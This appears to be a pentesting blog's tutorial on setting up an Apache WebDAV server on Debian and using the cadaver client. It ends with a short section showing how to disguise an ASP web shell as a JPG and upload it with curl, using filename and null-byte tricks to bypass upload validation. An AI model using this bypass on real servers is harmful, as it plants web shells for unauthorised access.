---
layout: post
title: "Setting Up A WebDav Server"
date: "2022-04-12"
description: "WebDAV works over HTTP and it has many benefits over transfer protocols such as FTP. These include strong encryption, robust authentication, proxy support, caching and multiple transfers through a single TCP connection (FTP requires a new connection for each file transferred.). This article looks at setting up a WebDav Server and then interacting with it via Cadaver."
coverimage: Setting_Up_A_WebDav_Server.jpg
tags: webdav
published: true
posttype: article
categories: tutorial
---
# Setting up a WebDav server

## Debian

Install apache2

```
root@vultr:~# apt-get install apache2
```

Enable the appropriate modules

```
root@vultr:~# a2enmod ssl
root@vultr:~# a2enmod dav_fs
root@vultr:~# a2enmod dav
```

Create an SSL certificate

```
mkdir /etc/apache2/ssl
openssl req $@ -new -x509 -days 365 -nodes -out /etc/apache2/ssl/apache.pem -keyout /etc/apache2/ssl/apache.pem
chmod 600 /etc/apache2/ssl/apache.pem
```

Create a webdav

```
root@vultr:~# mkdir /var/www/webdav
root@vultr:~# chown www-data:www-data /var/www/webdav
root@vultr:~# htpasswd -c /etc/apache2/passwd.webdav evilsaint
New password:
Re-type new password:
Adding password for user evilsaint
```

Edit the configuration file

```
root@vultr:~# cat <<EOF | tee /etc/apache2/sites-available/webdav.conf
<VirtualHost *:443>
         ServerAdmin user@host.com
         DocumentRoot /var/www/webdav
         ServerName mywebdav.lab
         DirectoryIndex disabled
         SSLEngine on
         SSLCertificateFile /etc/apache2/ssl/apache.pem
         Alias /webdav/ /var/www/webdav/

         <Location /webdav>
            DAV On
            AuthType Basic
            AuthName "webdav"
            AuthUserFile /etc/apache2/passwd.webdav
            Require valid-user
        </Location>

         ErrorLog  /var/log/webdav-error.log
         CustomLog /var/log/webdav-access.log combined
</VirtualHost>
EOF
```

Enable the site

```
a2ensite webdav
```

Restart the apache server

```
/etc/init.d/apache2 reload
```

We can now test with `cadaver` (see further info on this tool below)

```
root@evilsaint:/pentesting/enum# cadaver
dav:!> open https://104.238.128.52/webdav
WARNING: Untrusted server certificate presented for `myname':
Certificate was issued to hostname `myname' rather than `104.238.128.52'
This connection could have been intercepted.
Issued to: myorg, Widget maker, MYCITY, MYSTATE, UK
Issued by: myorg, Widget maker, MYCITY, MYSTATE, UK
Certificate is valid from Mon, 19 Mar 2018 22:57:50 GMT to Tue, 19 Mar 2019 22:57:50 GMT
Do you wish to accept the certificate? (y/n) y
Authentication required for webdav on server `104.238.128.52':
Username: evilsaint
Password:
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
       *test.txt                               0  Mar 19 23:31
dav:/webdav/> get test.txt
Downloading `/webdav/test.txt' to test.txt: [.] succeeded.
```

# Cadaver

We can use the tool Cadaver to interact with WebDAV servers.

We can query our cadaver version

```
cadaver -V
```

Start a cadaver connection to a webdav server.

```
cadaver 10.11.1.229
```

We can navigate directly into folders but we have to give a full web path

```
cadaver http://10.11.1.229/aspnet_client
```

## Upload Malicious Image Via Curl

To avoid the image content validator, we will prepend a valid JPG image to our ASP script

```
cat cat.jpg shell.asp > evil.asp;.jpg
```

```
curl --upload-file "evil.asp;.jpg" http://XX.XX.XX.XX/evil.asp;.jpg%00
```